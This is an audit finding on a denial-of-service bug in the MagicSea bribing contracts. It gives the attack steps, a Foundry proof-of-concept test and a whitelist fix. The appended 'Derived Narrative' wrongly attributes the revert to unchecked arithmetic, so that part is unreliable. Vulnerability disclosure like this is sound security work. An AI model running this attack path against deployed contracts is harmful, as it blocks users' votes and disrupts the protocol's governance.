---
id: 23013
severity: "High"
---

# Attacker can block all votes to a specific pool

## Description

An attacker can deploy a BribeRewarder contract using a custom token and distribute a huge number of those tokens to trigger an overflow error and prevent users from voting in a specific pool.

In the MagicSea protocol, bribing is a core mechanism. In short, users can permissionlessly create BribeRewarder contracts and fund them with tokens to bribe users in exchange for voting in specific pools.
When users vote for a specific pool through calling Voter::vote, the function _notifyBribes is called, which calls each BribeRewarder contract that is attached to that voted pool:
```solidity
function _notifyBribes(uint256 periodId, address pool, uint256 tokenId, uint256 deltaAmount) private {
    IBribeRewarder[] storage rewarders = _bribesPerPriod[periodId][pool];
    for (uint256 i = 0; i < rewarders.length; ++i) {
        if (address(rewarders[i]) != address(0)) {
            rewarders[i].deposit(periodId, tokenId, deltaAmount);
            _userBribesPerPeriod[periodId][tokenId].push(rewarders[i]);
        }
    }
}
```
An attacker can use this bribing mechanism to create malicious BribeRewarder contracts that will revert the transaction each time a user tries to vote for a specific pool. The attack path is the following:
1. An attacker creates a custom token and mints the maximum amount of tokens (type(uint256).max).
2. The attacker creates a BribeRewarder contract using the custom token.
3. The attacker transfers the total supply of the token to the rewarder contracts and sets it up to distribute the whole supply only in one period to a specific pool.
4. When that period starts, the attacker first uses 1 wei to vote for the selected pool, which will initialize the value of accDebtPerShare to a huge value.
5. When other legitimate users go to vote to that same pool, the transaction will revert due to overflow.

In step 4, the attacker votes using 1 wei to initialize accDebtPerShare to a huge value, which will happen here:
/src/libraries/Rewarder2.sol#L161
```solidity
function updateAccDebtPerShare(Parameter storage rewarder, uint256 totalSupply, uint256 totalRewards)
    internal
    returns (uint256)
{
    uint256 debtPerShare = getDebtPerShare(totalSupply, totalRewards);
    if (block.timestamp > rewarder.lastUpdateTimestamp)
        rewarder.lastUpdateTimestamp = block.timestamp;
    return debtPerShare == 0 ? rewarder.accDebtPerShare : rewarder.accDebtPerShare += debtPerShare;
}
```
```solidity
function getDebtPerShare(uint256 totalDeposit, uint256 totalRewards)
    internal pure returns (uint256)
{
    return totalDeposit == 0 ? 0 : (totalRewards << Constants.ACC_PRECISION_BITS) / totalDeposit;
}
```
In the presented scenario, the value of totalRewards will be huge (close to type(uint256).max) and the value of totalSupply will only be 1, which will cause the accDebtPerShare ends up being a huge value.

Later, when legitimate voters try to vote for that same pool, the transaction will revert due to overflow because the operation of deposit * accDebtPerShare will result in a value higher than type(uint256).max:
/src/libraries/Rewarder2.sol#L27-L29
```solidity
function getDebt(uint256 accDebtPerShare, uint256 deposit) internal pure returns (uint256) {
    return (deposit * accDebtPerShare) >> Constants.ACC_PRECISION_BITS;
}
```
By executing this sequence, an attacker can block all votes to specific pools during specific periods. If wanted, an attacker could block ALL votes to ALL pools during ALL periods, and the bug can only be resolved by upgrading the contracts or deploying new ones.
There aren't any external requirements or conditions for this attack to be executed, which means that the voting functionality can be gamed or completely hijacked at any point in time.

## Proof of Concept

The following PoC can be pasted in the file called BribeRewarder.t.sol and can be executed by running the command forge test --mt testOverflowRewards.
```solidity
function testOverflowRewards() public {
    // Create custom token
    IERC20 customRewardToken = IERC20(new ERC20Mock("Custom Reward Token", "CRT", 18));
    // Create rewarder with custom token
    rewarder = BribeRewarder(payable(address(factory.createBribeRewarder(customRewardToken, pool))));
    // Mint the max amount of custom token to rewarder
    ERC20Mock(address(customRewardToken)).mint(address(rewarder), type(uint256).max);
    // Start bribes
    rewarder.bribe(1, 1, type(uint256).max);
    // Start period
    _voterMock.setCurrentPeriod(1);
    _voterMock.setStartAndEndTime(0, 2 weeks);
    vm.warp(block.timestamp + 10);
    // Vote with 1 wei to initialize `accDebtPerShare` to a huge value
    vm.prank(address(_voterMock));
    rewarder.deposit(1, 1, 1);
    vm.warp(block.timestamp + 1 days);
    // Try to vote with 1e18 -- It overflows
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1e18);
    // Try to vote with 1e15 -- Still overflowing
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1e15);
    // Try now for a bigger vote -- Still overflowing
    vm.prank(address(_voterMock));
    vm.expectRevert(stdError.arithmeticError);
    rewarder.deposit(1, 1, 1_000e18);
}
```

## Recommendation

To mitigate this issue is recommended to create a whitelist of tokens that limits the tokens that can be used as rewards for bribing. This way, users won't be able to distribute a huge amount of tokens and block all the voting mechanisms.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an arithmetic overflow in the reward‑distribution logic of the MagicSea bribing system that can be used to deny‑of‑service the voting process for a chosen liquidity pool. The root cause is that the BribeRewarder contract accepts any ERC20 token as a reward and calculates a per‑share debt value (accDebtPerShare) by multiplying the total reward amount by a precision factor and dividing by the total supply of deposited tokens. Because the calculation uses unchecked arithmetic, an attacker can supply a token with a total supply equal to type(uint256).max and a total deposit of only one wei. This makes accDebtPerShare become an astronomically large number. When a legitimate user later votes and the contract attempts to compute deposit * accDebtPerShare, the multiplication overflows the 256‑bit integer range, causing the transaction to revert. The overflow is triggered inside the internal getDebt function, which shifts the product after multiplication, but the overflow occurs before the shift. The impact is that any vote for the targeted pool during the affected period fails, effectively blocking all voting activity for that pool. By repeating the attack across multiple pools or periods, an attacker could halt the entire governance or reward‑distribution mechanism of the protocol. The condition for exploitation is minimal: the attacker only needs to be able to create a BribeRewarder with a custom token, mint the maximum token amount, fund the rewarder, and cast a single minimal vote to initialise the inflated accDebtPerShare. No external permissions or time‑based constraints are required. Users experience a generic transaction failure – the vote transaction reverts with an arithmetic error, no vote is recorded, and expected bribe rewards are not received, which may appear as “my vote did not go through” or “I got no reward”. The issue was discovered during a security audit when the auditor examined the reward‑calculation functions and noticed the lack of bounds on totalRewards and the use of unchecked arithmetic. It is hard to notice because normal operation with reasonable token amounts works correctly; the overflow only manifests after an attacker deliberately injects an extreme token supply. The bug belongs to the class of unchecked arithmetic overflow leading to denial‑of‑service, especially in systems that allow unbounded external token inputs. To remediate, the protocol should restrict which tokens can be used for bribing (e.g., a whitelist), enforce reasonable caps on reward amounts, and employ safe‑math checks or require that totalRewards be less than a safe multiple of totalSupply before performing the multiplication. Upgrading the contracts to include these safeguards would prevent the overflow and restore normal voting functionality.
